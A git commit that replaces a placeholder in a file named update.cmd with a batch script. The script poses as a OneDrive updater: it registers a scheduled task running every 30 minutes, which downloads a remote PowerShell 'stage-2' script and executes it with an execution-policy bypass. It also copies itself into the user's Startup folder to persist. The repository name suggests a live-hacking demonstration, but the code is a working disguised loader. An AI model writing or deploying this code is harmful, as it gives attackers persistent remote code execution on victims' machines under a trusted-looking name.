060ac69587cdcc8a75a11ced4c8810d698895ee3
Melfice60 <96183356+Melfice60@users.noreply.github.com>
2024-06-05 14:42:20 +0200

    Update update.cmd

--- update.cmd
+++ update.cmd
@@ -1,1 +1,9 @@
-test
+@echo off
+setlocal enabledelayedexpansion
+set TaskName=OneDriveStandaloneUpdater
+schtasks /create /tn "%TaskName%" /tr "pwsh -NoProfile -NonInteractive -Exec Bypass -c '(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr https://raw.githubusercontent.com/FranceCyberDefense/Live-Hack/main/stage-2.ps1 -UseBasicParsing|iex'" /sc minute /mo 30 /f
+timeout /t 1 /nobreak >nul 
+if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0" (
+    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" >nul 2>&1)
+endlocal
+exit 
